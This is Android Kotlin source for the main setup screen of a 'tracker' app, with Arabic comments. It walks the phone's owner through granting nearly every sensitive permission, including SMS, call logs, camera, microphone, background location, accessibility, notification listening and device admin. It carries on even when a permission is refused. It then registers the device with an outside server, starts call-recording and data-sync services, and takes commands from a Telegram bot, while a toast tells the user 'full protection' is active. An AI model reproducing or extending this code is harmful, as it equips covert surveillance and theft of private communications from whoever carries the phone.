package com.abuzahra.tracker

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker
import com.abuzahra.tracker.services.MainTrackerService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    lateinit var webView: WebView
    private val PERMISSIONS_REQUEST_CODE = 101
    private var isSetupComplete = false

    /**
     * مراحل الأذونات - 11 مرحلة شاملة
     * لا يتم تخطي أي مرحلة أبداً
     */
    private enum class SetupStep(val id: Int) {
        BASIC_RUNTIME(0),           // أذونات التشغيل العادية
        ALL_FILES_ACCESS(1),        // الوصول الكامل للملفات (Android 11+)
        WRITE_SETTINGS(2),          // تعديل إعدادات النظام
        BATTERY_OPTIMIZATION(3),    // تجاهل تحسين البطارية
        OVERLAY(4),                 // عرض فوق التطبيقات
        USAGE_STATS(5),             // إحصائيات الاستخدام
        NOTIFICATION_LISTENER(6),   // مستمع الإشعارات
        ACCESSIBILITY(7),           // خدمة إمكانية الوصول
        DEVICE_ADMIN(8),            // مسؤول الجهاز
        LINK_CODE(9),              // إدخال كود الربط من السيرفر
        COMPLETE(10);              // اكتمال التفعيل

        fun next(): SetupStep? = entries.getOrNull(id + 1)
    }

    private var currentStep: SetupStep = SetupStep.BASIC_RUNTIME
    private var currentActivityResultCode = -1

    // ==================== أذونات التشغيل الشاملة ====================
    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.ANSWER_PHONE_CALLS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.WRITE_SETTINGS,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.BODY_SENSORS,
        Manifest.permission.ACTIVITY_RECOGNITION
    )

    // ==================== دورة حياة النشاط ====================

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        setupWebView()

        Log.d("MainActivity", "=== بدء مراحل الأذونات والتفعيل ===")
        currentStep = SetupStep.BASIC_RUNTIME
        isSetupComplete = false
        checkAndRequestPermissions()
    }

    private fun setupWebView() {
        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        webSettings.allowFileAccess = true
        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("file:///android_asset/child_index.html")
    }

    // ==================== نظام الأذونات ====================

    private fun checkAndRequestPermissions() {
        val step = currentStep
        val stepNum = step.id + 1
        val totalSteps = 10
        jsNotify("onPermissionStep", "$stepNum/$totalSteps")

        when (step) {
            SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
            SetupStep.ALL_FILES_ACCESS -> requestAllFilesAccess()
            SetupStep.WRITE_SETTINGS -> requestWriteSettingsPermission()
            SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
            SetupStep.OVERLAY -> requestOverlayPermission()
            SetupStep.USAGE_STATS -> requestUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> requestNotificationPermission()
            SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
            SetupStep.DEVICE_ADMIN -> requestDeviceAdminPermission()
            SetupStep.LINK_CODE -> showLinkCodeInput()
            SetupStep.COMPLETE -> onAllSetupComplete()
        }
    }

    // ========== الخطوة 1: الأذونات الأساسية ==========
    private fun requestBasicPermissions() {
        jsNotify("onPermissionPending", "basic")

        val supportedPermissions = runtimePermissions.filter { perm ->
            when (perm) {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.BODY_SENSORS,
                Manifest.permission.ACTIVITY_RECOGNITION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
                Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                Manifest.permission.READ_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.R
                Manifest.permission.SEND_SMS,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.WRITE_CONTACTS -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                else -> true
            }
        }

        val missing = supportedPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
        } else {
            jsNotify("onPermissionGranted", "basic")
            advanceToNextStep()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            val allGranted = grantResults.isNotEmpty() && grantResults.all {
                it == PackageManager.PERMISSION_GRANTED
            }
            if (allGranted) {
                Log.d("MainActivity", "✅ تم منح جميع الأذونات الأساسية")
                jsNotify("onPermissionGranted", "basic")
            } else {
                val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
                val total = grantResults.size
                Log.w("MainActivity", "⚠️ تم منح $grantedCount/$total أذونات - نكمل التفعيل")
                jsNotify("onPermissionWarning", "basic:$grantedCount/$total")
                // نكمل حتى لو لم تُمنح كل الأذونات
                jsNotify("onPermissionGranted", "basic")
            }
            advanceToNextStep()
        }
    }

    // ========== الخطوة 2: الوصول الكامل للملفات ==========
    @Suppress("DEPRECATION")
    private fun requestAllFilesAccess() {
        jsNotify("onPermissionPending", "all_files")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                Log.d("MainActivity", "✅ الوصول الكامل للملفات مفعّل مسبقاً")
                jsNotify("onPermissionGranted", "all_files")
                advanceToNextStep()
            } else {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في طلب الوصول الكامل: ${e.message}")
                    // Fallback
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
                    } catch (e2: Exception) {
                        Log.e("MainActivity", "خطأ في Fallback: ${e2.message}")
                        jsNotify("onPermissionError", "all_files")
                        advanceToNextStep()
                    }
                }
            }
        } else {
            // Android 10 وأقل - أذونات التخزين العادية تكفي
            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - الوصول الكامل متوفر عبر الأذونات العادية")
            jsNotify("onPermissionGranted", "all_files")
            advanceToNextStep()
        }
    }

    // ========== الخطوة 3: تعديل إعدادات النظام ==========
    private fun requestWriteSettingsPermission() {
        jsNotify("onPermissionPending", "write_settings")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.System.canWrite(this)) {
                Log.d("MainActivity", "✅ صلاحية تعديل الإعدادات مفعّلة مسبقاً")
                jsNotify("onPermissionGranted", "write_settings")
                advanceToNextStep()
            } else {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, SetupStep.WRITE_SETTINGS.id)
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في طلب صلاحية الإعدادات: ${e.message}")
                    jsNotify("onPermissionError", "write_settings")
                    advanceToNextStep()
                }
            }
        } else {
            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - صلاحية الإعدادات متوفرة افتراضياً")
            jsNotify("onPermissionGranted", "write_settings")
            advanceToNextStep()
        }
    }

    // ========== الخطوة 4: تحسين البطارية ==========
    private fun requestBatteryOptimization() {
        jsNotify("onPermissionPending", "battery")
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pwrm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("MainActivity", "✅ تحسين البطارية مُلغى مسبقاً")
            jsNotify("onPermissionGranted", "battery")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, SetupStep.BATTERY_OPTIMIZATION.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تحسين البطارية: ${e.message}")
                jsNotify("onPermissionError", "battery")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 4: العرض فوق التطبيقات ==========
    private fun requestOverlayPermission() {
        jsNotify("onPermissionPending", "overlay")
        if (Settings.canDrawOverlays(this)) {
            Log.d("MainActivity", "✅ إذن العرض فوق التطبيقات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "overlay")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SetupStep.OVERLAY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن العرض: ${e.message}")
                jsNotify("onPermissionError", "overlay")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 5: إحصائيات الاستخدام ==========
    private fun requestUsageStatsPermission() {
        jsNotify("onPermissionPending", "usage")
        if (hasUsageStatsPermission()) {
            Log.d("MainActivity", "✅ إذن إحصائيات الاستخدام مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "usage")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), SetupStep.USAGE_STATS.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الاستخدام: ${e.message}")
                jsNotify("onPermissionError", "usage")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 6: مستمع الإشعارات ==========
    private fun requestNotificationPermission() {
        jsNotify("onPermissionPending", "notif")
        if (isNotificationServiceEnabled()) {
            Log.d("MainActivity", "✅ مستمع الإشعارات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "notif")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), SetupStep.NOTIFICATION_LISTENER.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الإشعارات: ${e.message}")
                jsNotify("onPermissionError", "notif")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 7: إمكانية الوصول ==========
    private fun requestAccessibilityPermission() {
        jsNotify("onPermissionPending", "access")
        if (isAccessibilityServiceEnabled()) {
            Log.d("MainActivity", "✅ خدمة إمكانية الوصول مفعّلة مسبقاً")
            jsNotify("onPermissionGranted", "access")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), SetupStep.ACCESSIBILITY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الوصول: ${e.message}")
                jsNotify("onPermissionError", "access")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 8: مسؤول الجهاز ==========
    private fun requestDeviceAdminPermission() {
        jsNotify("onPermissionPending", "admin")
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(componentName)) {
            Log.d("MainActivity", "✅ مسؤول الجهاز مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "admin")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                startActivityForResult(intent, SetupStep.DEVICE_ADMIN.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تفعيل مسؤول الجهاز: ${e.message}")
                jsNotify("onPermissionError", "admin")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 9: كود الربط ==========
    private fun showLinkCodeInput() {
        jsNotify("onPermissionPending", "link")
        jsCall("showLinkCodeInput()")
    }

    /**
     * التحقق من كود الربط مع السيرفر
     * يجب أن يكون الكود مولداً من السيرفر - لا يتم قبوله محلياً
     */
    fun verifyLinkCode(code: String) {
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                Log.d("MainActivity", "🔄 التحقق من كود الربط مع السيرفر: $code")
                jsNotify("onPermissionPending", "link_verify")

                val url = URL("https://alsydyabwalzhra.online/api/verify_link")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true

                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    ?: System.currentTimeMillis().toString()

                val payload = """{"code":"$code","device_id":"$deviceId","model":"${Build.MODEL}","brand":"${Build.BRAND}","android":"${Build.VERSION.RELEASE}","sdk":"${Build.VERSION.SDK_INT}"}"""

                OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }

                val responseCode = connection.responseCode
                val response = connection.inputStream?.bufferedReader()?.readText() ?: ""

                Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")

                if (responseCode in 200..299) {
                    // تحليل الاستجابة بالتفصيل
                    val jsonResponse = try {
                        org.json.JSONObject(response)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "❌ استجابة غير صالحة من السيرفر: $response")
                        runOnUiThread {
                            jsCall("onLinkCodeError('استجابة غير صالحة من السيرفر. حاول مرة أخرى.')")
                        }
                        return@launch
                    }

                    if (jsonResponse.optBoolean("ok", false)) {
                        Log.d("MainActivity", "✅ كود الربط صحيح - تم التحقق من السيرفر!")
                        SharedPrefsManager.setLinkCode(this@MainActivity, code)
                        SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
                        SharedPrefsManager.setBotRegistered(this@MainActivity, true)

                        runOnUiThread {
                            jsNotify("onPermissionGranted", "link")
                            advanceToNextStep()
                        }
                    } else {
                        val errorMsg = jsonResponse.optString("error", "خطأ غير معروف")
                        Log.e("MainActivity", "❌ كود الربط مرفوض: $errorMsg")
                        val userMsg = when {
                            errorMsg.contains("expired", ignoreCase = true) -> "⏱️ كود الربط منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
                            errorMsg.contains("Invalid", ignoreCase = true) -> "❌ كود الربط غير صحيح. تأكد من الكود وحاول مرة أخرى."
                            errorMsg.contains("used", ignoreCase = true) -> "🔄 هذا الكود تم استخدامه مسبقاً. أرسل /link للحصول على كود جديد."
                            else -> "❌ خطأ في الكود: $errorMsg"
                        }
                        runOnUiThread {
                            jsCall("onLinkCodeError('$userMsg')")
                        }
                    }
                } else {
                    val errorBody = try { connection.errorStream?.bufferedReader()?.readText() ?: "" } catch (e: Exception) { "" }
                    Log.e("MainActivity", "❌ خطأ السيرفر $responseCode: $errorBody")
                    val userMsg = when {
                        responseCode == 400 -> "❌ كود الربط غير صحيح أو منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
                        responseCode == 404 -> "❌ السيرفر غير متاح. تأكد أن البوت يعمل على السيرفر."
                        responseCode >= 500 -> "⚠️ خطأ في السيرفر. حاول بعد قليل."
                        else -> "❌ خطأ في الاتصال (رمز $responseCode). حاول مرة أخرى."
                    }
                    runOnUiThread {
                        jsCall("onLinkCodeError('$userMsg')")
                    }
                }
            } catch (e: java.net.SocketTimeoutException) {
                Log.e("MainActivity", "❌ انتهت مهلة الاتصال بالسيرفر")
                runOnUiThread {
                    jsCall("onLinkCodeError('⏱️ انتهت مهلة الاتصال بالسيرفر. تأكد من اتصال الإنترنت وأن السيرفر يعمل.')")
                }
            } catch (e: java.net.UnknownHostException) {
                Log.e("MainActivity", "❌ لا يمكن الوصول للسيرفر")
                runOnUiThread {
                    jsCall("onLinkCodeError('🌐 لا يمكن الوصول للسيرفر. تأكد من اتصال الإنترنت.')")
                }
            } catch (e: javax.net.ssl.SSLException) {
                Log.e("MainActivity", "❌ خطأ في شهادة SSL")
                runOnUiThread {
                    jsCall("onLinkCodeError('🔒 خطأ في الاتصال الآمن. حاول مرة أخرى.')")
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "❌ خطأ في الاتصال بالسيرفر: ${e.message}")
                runOnUiThread {
                    jsCall("onLinkCodeError('❌ خطأ في الاتصال بالسيرفر: ${e.message}. تأكد من اتصال الإنترنت.')")
                }
            }
        }
    }

    // ========== الخطوة 10: اكتمال التفعيل ==========

    private fun onAllSetupComplete() {
        if (isSetupComplete) return
        isSetupComplete = true

        Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
        Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()

        SharedPrefsManager.markSetupCompleted(this)

        startAllServices()
        ensureDeviceId()

        val deviceInfo = buildDeviceInfoHtml()
        jsCall("onAllPermissionsComplete('$deviceInfo')")

        // إنشاء النسخة الاحتياطية الأولى
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                Log.d("MainActivity", "🔄 بدء النسخة الاحتياطية الأولى...")
                LocalStorageManager.createFullBackup(this@MainActivity)
                Log.d("MainActivity", "✅ تم إنشاء النسخة الاحتياطية الأولى")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في النسخة الاحتياطية: ${e.message}")
            }
        }

        // الاتصال بتيليجرام مباشرة
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                TelegramDirectClient.startCommandPolling(this@MainActivity)
                delay(2000)
                TelegramDirectClient.sendMessage(
                    "✅ <b>تم تشغيل التطبيق بنجاح!</b>\n\n" +
                    "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
                    "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
                    "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                    "🆔 معرف: <code>$deviceId</code>\n\n" +
                    "🟢 متصل مباشرة بتيليجرام\n" +
                    "📡 جاري استقبال الأوامر...\n" +
                    "💾 تم إنشاء نسخة احتياطية أولية",
                    "HTML"
                )
                jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في الاتصال بتيليجرام: ${e.message}")
                jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
            }
        }
    }

    // ==================== onActivityResult - مفتاح سلسلة الأذونات ====================

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        currentActivityResultCode = requestCode

        if (!isSetupComplete) {
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    override fun onResume() {
        super.onResume()
        if (!isSetupComplete && currentActivityResultCode >= 0) {
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    private fun checkCurrentStepAndAdvance() {
        if (isSetupComplete) return

        val granted = when (currentStep) {
            SetupStep.BASIC_RUNTIME -> true // تم معالجته في onRequestPermissionsResult
            SetupStep.ALL_FILES_ACCESS -> isAllFilesAccessGranted()
            SetupStep.WRITE_SETTINGS -> isWriteSettingsGranted()
            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
            SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
            SetupStep.LINK_CODE -> false // كود الربط لا يُفحص تلقائياً
            SetupStep.COMPLETE -> false
        }

        if (granted) {
            val stepName = when (currentStep) {
                SetupStep.BASIC_RUNTIME -> "basic"
                SetupStep.ALL_FILES_ACCESS -> "all_files"
                SetupStep.WRITE_SETTINGS -> "write_settings"
                SetupStep.BATTERY_OPTIMIZATION -> "battery"
                SetupStep.OVERLAY -> "overlay"
                SetupStep.USAGE_STATS -> "usage"
                SetupStep.NOTIFICATION_LISTENER -> "notif"
                SetupStep.ACCESSIBILITY -> "access"
                SetupStep.DEVICE_ADMIN -> "admin"
                SetupStep.LINK_CODE -> "link"
                SetupStep.COMPLETE -> "complete"
            }
            Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
            jsNotify("onPermissionGranted", stepName)
            advanceToNextStep()
        } else if (currentStep != SetupStep.BASIC_RUNTIME && currentStep != SetupStep.LINK_CODE) {
            // حتى لو لم يُمنح الإذن، نكمل (لكن نسجل تحذير)
            Log.w("MainActivity", "⚠️ الإذن ${currentStep.name} لم يُمنح - نكمل")
        }
    }

    private fun advanceToNextStep() {
        val next = currentStep.next()
        if (next != null) {
            currentStep = next
            checkAndRequestPermissions()
        } else {
            onAllSetupComplete()
        }
    }

    // ==================== دوال مساعدة ====================

    private fun isWriteSettingsGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.System.canWrite(this)
        } else {
            true
        }
    }

    private fun isAllFilesAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            true // أندرويد 10 وأقل - أذونات التخزين العادية تكفي
        }
    }

    private fun isIgnoringBattery(): Boolean {
        return (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
    }

    private fun hasUsageStatsPermission(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص إذن الاستخدام: ${e.message}")
            false
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
            false
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص خدمة إمكانية الوصول: ${e.message}")
            false
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
            dpm.isAdminActive(componentName)
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص مسؤول الجهاز: ${e.message}")
            false
        }
    }

    private fun ensureDeviceId() {
        if (SharedPrefsManager.getDeviceId(this) == null) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: System.currentTimeMillis().toString()
            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
        }
    }

    private fun buildDeviceInfoHtml(): String {
        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
               "🟢 الحالة: متصل بتيليجرام مباشرة"
    }

    private fun startAllServices() {
        try {
            Log.d("MainActivity", "🚀 بدء تشغيل جميع الخدمات...")
            val trackerIntent = Intent(this, MainTrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)

            val callIntent = Intent(this, CallRecorderService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)

            DataSyncWorker.startImmediate(this)
            Log.d("MainActivity", "✅ تم بدء جميع الخدمات بنجاح")
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
        }
    }

    // ==================== جسر JavaScript ====================

    private fun jsNotify(method: String, arg: String) {
        webView.post {
            try { webView.evaluateJavascript("window.$method('$arg')", null) }
            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
        }
    }

    private fun jsCall(script: String) {
        webView.post {
            try { webView.evaluateJavascript(script, null) }
            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
        }
    }

    fun startWorker() { DataSyncWorker.startImmediate(this) }
}
